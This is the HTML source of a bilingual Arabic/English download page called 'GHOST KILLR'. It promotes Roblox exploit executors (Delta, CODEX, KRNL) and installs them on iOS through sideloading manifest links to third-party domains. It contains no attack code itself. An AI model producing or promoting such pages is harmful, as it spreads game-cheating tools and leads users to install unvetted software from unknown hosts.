<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap" rel="stylesheet"/>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: 'Cairo', sans-serif;
      margin: 0;
      animation: fadeIn 2s ease-out;
      text-align: center;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .container, .content-section {
      background-color: #222;
      padding: 30px;
      margin: 20px auto;
      border-radius: 15px;
      width: 90%;
      max-width: 900px;
    }

    h1 {
      font-size: 60px;
      margin-bottom: 20px;
    }

    .description {
      font-size: 18px;
      margin-bottom: 30px;
      color: #ccc;
    }

    .download-btn {
      background-color: red;
      color: white;
      padding: 15px 30px;
      font-size: 20px;
      border-radius: 25px;
      margin: 10px auto;
      display: block;
      width: fit-content;
      transition: all 0.3s ease-in-out;
      font-family: 'VIP Hala', sans-serif;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.4), 0 0 20px rgba(255, 255, 255, 0.2) inset;
      text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
      cursor: pointer;
    }

    .download-btn:hover {
      background-color: darkred;
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.8), 0 0 20px rgba(255, 255, 255, 0.5) inset;
      transform: scale(1.08);
    }

    .social-container {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 10px;
      flex-wrap: wrap;
      flex-direction: row;
    }

    .social-btn {
      background-color: #444;
      color: white;
      padding: 10px 20px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      gap: 8px;
      text-decoration: none;
    }

    .social-btn img {
      width: 20px;
      height: 20px;
    }

    .lang-btn {
      background-color: red;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 20px;
      margin: 5px;
      cursor: pointer;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div id="langSelect" class="container">
    <h1>𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑</h1>
    <p>Choose your language - اختر لغتك</p>
    <button class="lang-btn" onclick="setLanguage('ar')">العربية</button>
    <button class="lang-btn" onclick="setLanguage('en')">English</button>
  </div>

  <div id="mainContent" style="display:none;">
    <div class="container">
      <h1 id="title">𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑</h1>
      <div class="description" id="desc">

      </div>

      <!-- الزرين العلويين -->
      <div class="container" id="buttonsTop">
        <div class="download-btn" id="deltaBtn" onclick="installApp('itms-services://?action=download-manifest&amp;url=https%3A%2F%2Fdeltaios-executor.com%2FInstall2.plist')">تثبيت Delta</div>

        <div class="download-btn" id="codexBtn" onclick="installApp('https://codex-ios.com/Install.plist')">تثبيت CODEX</div>
      </div>

      <!-- الزر السفلي -->
      <div class="container" id="buttonsBottom">
        <div class="download-btn" id="krnlBtn" onclick="installApp('itms-services://?action=download-manifest&amp;url=https://krnl-ios.com/Install2.plist')">تثبيت KRNL</div>
      </div>

      <!-- وسائل التواصل -->
      <div class="social-container">
        <p>تابعنا على وسائل التواصل الاجتماعي لمزيد من التطبيقات!</p>

        <a href="https://t.me/ka_killr" class="social-btn" target="_blank">
          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="Telegram"> تيليجرام
        </a>

        <a href="https://www.youtube.com/@Ka_KILLR" class="social-btn" target="_blank">
          <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube"> يوتيوب
        </a>
      </div>
    </div>
  </div>

  <script>
    function setLanguage(lang) {
      document.getElementById('langSelect').style.display = 'none';
      document.getElementById('mainContent').style.display = 'block';

      if (lang === 'en') {
        document.documentElement.lang = 'en';
        document.documentElement.dir = 'ltr';

        document.getElementById('title').textContent = '𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑';
        document.getElementById('desc').textContent = 'Delta Executor is one of the most popular Roblox exploits. Download version 2.0 now for iOS without a computer!';

        document.getElementById('deltaBtn').textContent = 'Direct Delta';
        document.getElementById('codexBtn').textContent = 'Direct CODEX';
        document.getElementById('krnlBtn').textContent = 'Direct KRNL';
      } else {
        document.documentElement.lang = 'ar';
        document.documentElement.dir = 'rtl';

        document.getElementById('title').textContent = '𝐆𝐇𝐎𝐒𝐓 𝐊𝐈𝑳𝑳𝐑';
        document.getElementById('desc').textContent = 'Delta Executor هو واحد من أشهر أدوات استغلال Roblox. حمل الإصدار 2.0 الآن لأجهزة iOS بدون الحاجة إلى كمبيوتر!';

        document.getElementById('deltaBtn').textContent = 'تثبيت Delta';
        document.getElementById('codexBtn').textContent = 'تثبيت CODEX';
        document.getElementById('krnlBtn').textContent = 'تثبيت KRNL';
      }
    }

    function installApp(url) {
      window.location.href = url;
    }
  </script>
</body>
</html>
